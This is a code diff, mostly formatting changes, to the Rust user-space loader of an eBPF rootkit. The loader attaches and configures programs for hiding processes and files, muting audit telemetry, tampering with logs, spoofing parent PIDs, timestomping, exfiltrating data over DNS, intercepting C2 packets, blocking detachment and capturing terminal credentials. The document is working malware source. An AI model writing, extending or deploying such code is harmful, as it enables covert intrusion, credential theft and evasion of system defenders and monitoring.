@@ -2,22 +2,23 @@ use anyhow::{Context, Result};
 use aya::{
     include_bytes_aligned,
     maps::{AsyncPerfEventArray, HashMap},
-    programs::{KProbe, Xdp, XdpFlags, TracePoint, tc::{SchedClassifier, TcAttachType}},
-    Ebpf, Btf,
+    programs::{
+        tc::{SchedClassifier, TcAttachType},
+        KProbe, TracePoint, Xdp, XdpFlags,
+    },
+    Btf, Ebpf,
 };
 use aya_log::EbpfLogger;
 use bytes::BytesMut;
 use clap::Parser;
 use common::{
-    RootkitConfig, EventHeader, CredentialCapture, TimestompEntry,
-    EVENT_PROC_HIDDEN, EVENT_PACKET_INTERCEPTED, EVENT_FILE_OBFUSCATED,
-    EVENT_LOG_TAMPERED, EVENT_ANCESTRY_SPOOFED,
-    EVENT_DNS_EXFIL, EVENT_KALLSYMS_HIDDEN, EVENT_ANTI_DETACH,
-    EVENT_TIMESTOMPED, EVENT_C2_AUTH_FAILED, EVENT_TELEMETRY_MUTED,
-    BPF_PIN_PATH,
+    CredentialCapture, EventHeader, RootkitConfig, TimestompEntry, BPF_PIN_PATH,
+    EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH, EVENT_C2_AUTH_FAILED, EVENT_DNS_EXFIL,
+    EVENT_FILE_OBFUSCATED, EVENT_KALLSYMS_HIDDEN, EVENT_LOG_TAMPERED, EVENT_PACKET_INTERCEPTED,
+    EVENT_PROC_HIDDEN, EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
 };
-use offense::{parse_tty_device, parse_spoof_ppid, parse_timestomp};
-use log::{info, warn, error, debug};
+use log::{debug, error, info, warn};
+use offense::{parse_spoof_ppid, parse_timestomp, parse_tty_device};
 use std::fs;
 use std::path::Path;
 use tokio::signal;
@@ -63,9 +64,9 @@ struct Cli {
 async fn main() -> Result<()> {
     let cli = Cli::parse();
 
-    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or(
-        if cli.verbose { "debug" } else { "info" }
-    ))
+    env_logger::Builder::from_env(
+        env_logger::Env::default().default_filter_or(if cli.verbose { "debug" } else { "info" }),
+    )
     .init();
 
     // Bump the memlock rlimit for eBPF
@@ -148,7 +149,10 @@ async fn main() -> Result<()> {
         .try_into()?;
     xdp_prog.load()?;
     xdp_prog.attach(&cli.iface, XdpFlags::default())?;
-    info!("✓ Feature 2: Network Stealth (XDP) attached to {}", cli.iface);
+    info!(
+        "✓ Feature 2: Network Stealth (XDP) attached to {}",
+        cli.iface
+    );
 
     // Load Feature 3: File Obfuscation (vfs_read)
     let vfs_read: &mut KProbe = bpf
@@ -166,7 +170,10 @@ async fn main() -> Result<()> {
         .try_into()?;
     audit_syscall.load()?;
     if let Err(e) = audit_syscall.attach("audit_log_start", 0) {
-        warn!("⚠ Failed to attach audit_log_start: {} (audit may not be enabled)", e);
+        warn!(
+            "⚠ Failed to attach audit_log_start: {} (audit may not be enabled)",
+            e
+        );
     } else {
         info!("✓ Feature 4: Telemetry Muting (audit) loaded");
     }
@@ -221,7 +228,10 @@ async fn main() -> Result<()> {
         .try_into()?;
     tc_prog.load()?;
     tc_prog.attach(&cli.iface, TcAttachType::Egress)?;
-    info!("✓ Feature 9: DNS Exfiltration (TC egress) attached to {}", cli.iface);
+    info!(
+        "✓ Feature 9: DNS Exfiltration (TC egress) attached to {}",
+        cli.iface
+    );
 
     // Load Feature 10: Kallsyms Hiding (vfs_read on /proc/kallsyms)
     let hide_kallsyms: &mut KProbe = bpf
@@ -259,15 +269,19 @@ async fn main() -> Result<()> {
 
     // Apply CLI configurations
     if let Some(pid) = cli.hide_pid {
-        let mut hidden_pids: HashMap<_, u32, u8> =
-            HashMap::try_from(bpf.map_mut("HIDDEN_PIDS").context("HIDDEN_PIDS not found")?)?;
+        let mut hidden_pids: HashMap<_, u32, u8> = HashMap::try_from(
+            bpf.map_mut("HIDDEN_PIDS")
+                .context("HIDDEN_PIDS not found")?,
+        )?;
         hidden_pids.insert(pid, 1u8, 0)?;
         info!("✓ Hiding PID: {}", pid);
     }
 
     if let Some(inode) = cli.obfuscate_inode {
-        let mut obfuscate_inodes: HashMap<_, u64, u8> =
-            HashMap::try_from(bpf.map_mut("OBFUSCATE_INODES").context("OBFUSCATE_INODES not found")?)?;
+        let mut obfuscate_inodes: HashMap<_, u64, u8> = HashMap::try_from(
+            bpf.map_mut("OBFUSCATE_INODES")
+                .context("OBFUSCATE_INODES not found")?,
+        )?;
         obfuscate_inodes.insert(inode, 1u8, 0)?;
         info!("✓ Obfuscating inode: {}", inode);
     }
@@ -275,8 +289,10 @@ async fn main() -> Result<()> {
     if let Some(tty) = cli.monitor_tty {
         if let Some((major, minor)) = parse_tty_device(&tty) {
             let dev_key = ((major as u64) << 32) | (minor as u64);
-            let mut monitored_ttys: HashMap<_, u64, u8> =
-                HashMap::try_from(bpf.map_mut("MONITORED_TTYS").context("MONITORED_TTYS not found")?)?;
+            let mut monitored_ttys: HashMap<_, u64, u8> = HashMap::try_from(
+                bpf.map_mut("MONITORED_TTYS")
+                    .context("MONITORED_TTYS not found")?,
+            )?;
             monitored_ttys.insert(dev_key, 1u8, 0)?;
             info!("✓ Monitoring TTY: {} ({}:{})", tty, major, minor);
         } else {
@@ -286,8 +302,10 @@ async fn main() -> Result<()> {
 
     if let Some(spoof) = cli.spoof_ppid {
         if let Some((pid, fake_ppid)) = parse_spoof_ppid(&spoof) {
-            let mut spoofed_ppids: HashMap<_, u32, u32> =
-                HashMap::try_from(bpf.map_mut("SPOOFED_PPIDS").context("SPOOFED_PPIDS not found")?)?;
+            let mut spoofed_ppids: HashMap<_, u32, u32> = HashMap::try_from(
+                bpf.map_mut("SPOOFED_PPIDS")
+                    .context("SPOOFED_PPIDS not found")?,
+            )?;
             spoofed_ppids.insert(pid, fake_ppid, 0)?;
             info!("✓ Spoofing PPID: {} → {}", pid, fake_ppid);
         } else {
@@ -297,8 +315,10 @@ async fn main() -> Result<()> {
 
     if let Some(ts) = cli.timestomp {
         if let Some((inode, entry)) = parse_timestomp(&ts) {
-            let mut timestomp_inodes: HashMap<_, u64, TimestompEntry> =
-                HashMap::try_from(bpf.map_mut("TIMESTOMP_INODES").context("TIMESTOMP_INODES not found")?)?;
+            let mut timestomp_inodes: HashMap<_, u64, TimestompEntry> = HashMap::try_from(
+                bpf.map_mut("TIMESTOMP_INODES")
+                    .context("TIMESTOMP_INODES not found")?,
+            )?;
             timestomp_inodes.insert(inode, entry, 0)?;
             info!("✓ Timestomping inode: {}", inode);
         } else {
@@ -383,8 +403,12 @@ async fn monitor_events(mut bpf: Ebpf) {
     }
 }
 
-async fn process_event_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>) {
-    let mut bufs = (0..10).map(|_| BytesMut::with_capacity(1024)).collect::<Vec<_>>();
+async fn process_event_buf(
+    mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>,
+) {
+    let mut bufs = (0..10)
+        .map(|_| BytesMut::with_capacity(1024))
+        .collect::<Vec<_>>();
     loop {
         let events = match buf.read_events(&mut bufs).await {
             Ok(events) => events,
@@ -396,9 +420,8 @@ async fn process_event_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<a
         for i in 0..events.read {
             let data = &bufs[i];
             if data.len() >= std::mem::size_of::<EventHeader>() {
-                let event = unsafe {
-                    std::ptr::read_unaligned(data.as_ptr() as *const EventHeader)
-                };
+                let event =
+                    unsafe { std::ptr::read_unaligned(data.as_ptr() as *const EventHeader) };
                 log_event(&event);
             }
         }
@@ -406,7 +429,9 @@ async fn process_event_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<a
 }
 
 async fn process_cred_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>) {
-    let mut bufs = (0..10).map(|_| BytesMut::with_capacity(1024)).collect::<Vec<_>>();
+    let mut bufs = (0..10)
+        .map(|_| BytesMut::with_capacity(1024))
+        .collect::<Vec<_>>();
     loop {
         let events = match buf.read_events(&mut bufs).await {
             Ok(events) => events,
@@ -418,9 +443,8 @@ async fn process_cred_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<ay
         for i in 0..events.read {
             let data = &bufs[i];
             if data.len() >= std::mem::size_of::<CredentialCapture>() {
-                let capture = unsafe {
-                    std::ptr::read_unaligned(data.as_ptr() as *const CredentialCapture)
-                };
+                let capture =
+                    unsafe { std::ptr::read_unaligned(data.as_ptr() as *const CredentialCapture) };
                 log_credential_capture(&capture);
             }
         }
@@ -433,28 +457,49 @@ fn log_event(event: &EventHeader) {
             debug!("🙈 Process hidden: PID={}", event.pid);
         }
         EVENT_PACKET_INTERCEPTED => {
-            debug!("📦 C2 packet intercepted: cmd_type={}, arg={}", event.pid, event.context);
+            debug!(
+                "📦 C2 packet intercepted: cmd_type={}, arg={}",
+                event.pid, event.context
+            );
         }
         EVENT_FILE_OBFUSCATED => {
-            debug!("📄 File obfuscated: PID={}, inode={}", event.pid, event.context);
+            debug!(
+                "📄 File obfuscated: PID={}, inode={}",
+                event.pid, event.context
+            );
         }
         EVENT_LOG_TAMPERED => {
-            debug!("📝 Log tampered: PID={}, bytes={}", event.pid, event.context);
+            debug!(
+                "📝 Log tampered: PID={}, bytes={}",
+                event.pid, event.context
+            );
         }
         EVENT_ANCESTRY_SPOOFED => {
-            debug!("👪 Ancestry spoofed: PID={}, fake_ppid={}", event.pid, event.context);
+            debug!(
+                "👪 Ancestry spoofed: PID={}, fake_ppid={}",
+                event.pid, event.context
+            );
         }
         EVENT_DNS_EXFIL => {
             debug!("🌐 DNS exfiltration: seq={}", event.context);
         }
         EVENT_KALLSYMS_HIDDEN => {
-            debug!("🔍 Kallsyms hidden: PID={}, inode={}", event.pid, event.context);
+            debug!(
+                "🔍 Kallsyms hidden: PID={}, inode={}",
+                event.pid, event.context
+            );
         }
         EVENT_ANTI_DETACH => {
-            debug!("🛡️ Detach attempt blocked: PID={}, cmd={}", event.pid, event.context);
+            debug!(
+                "🛡️ Detach attempt blocked: PID={}, cmd={}",
+                event.pid, event.context
+            );
         }
         EVENT_TIMESTOMPED => {
-            debug!("⏰ Timestamp spoofed: PID={}, inode={}", event.pid, event.context);
+            debug!(
+                "⏰ Timestamp spoofed: PID={}, inode={}",
+                event.pid, event.context
+            );
         }
         EVENT_C2_AUTH_FAILED => {
             warn!("⚠️ C2 authentication failed: encrypted={}", event.context);
@@ -470,9 +515,10 @@ fn log_event(event: &EventHeader) {
 
 fn log_credential_capture(capture: &CredentialCapture) {
     let data_str = String::from_utf8_lossy(&capture.data[..capture.data_len as usize]);
-    info!("🔑 Credential captured: PID={}, FD={}, data={:?}", 
-          capture.pid, capture.fd, data_str);
+    info!(
+        "🔑 Credential captured: PID={}, FD={}, data={:?}",
+        capture.pid, capture.fd, data_str
+    );
 }
-
 
 // Made with Bob
